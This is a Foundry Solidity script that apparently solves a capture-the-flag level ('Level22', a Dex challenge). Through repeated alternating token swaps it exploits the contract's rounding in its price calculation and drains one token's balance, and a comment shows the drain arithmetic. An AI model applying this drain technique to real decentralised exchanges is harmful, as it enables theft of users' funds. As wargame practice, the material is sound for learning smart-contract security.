// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{Dex} from "../src/Level22.sol";
contract Level22Solution is Script{
    Dex instance=Dex(0x4441a9dfB5e761cB6fCf356c093AE7A42fD258C7);
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        //to spend the tokens first they need approval
        instance.approve(address(instance), 300);   //means 300 tokens are approved of each type
        address token1=instance.token1();
        address token2=instance.token2();
        console.log("token1 balance",instance.balanceOf(token1, address(instance)));
        console.log("token2 balance",instance.balanceOf(token2, address(instance)));
        instance.swap(token1, token2, 10);
        instance.swap(token2,token1,20);
        instance.swap(token1, token2, 24);
        instance.swap(token2,token1,30);
        instance.swap(token1, token2, 41);
        instance.swap(token2,token1,45);  // just 45 tokens are enough to drain 110 token1's
        // (45*110)/45 = 110 tokens
        vm.stopBroadcast();
        console.log("token1 balance",instance.balanceOf(token1, address(instance)));
        console.log("token2 balance",instance.balanceOf(token2, address(instance)));
    }
}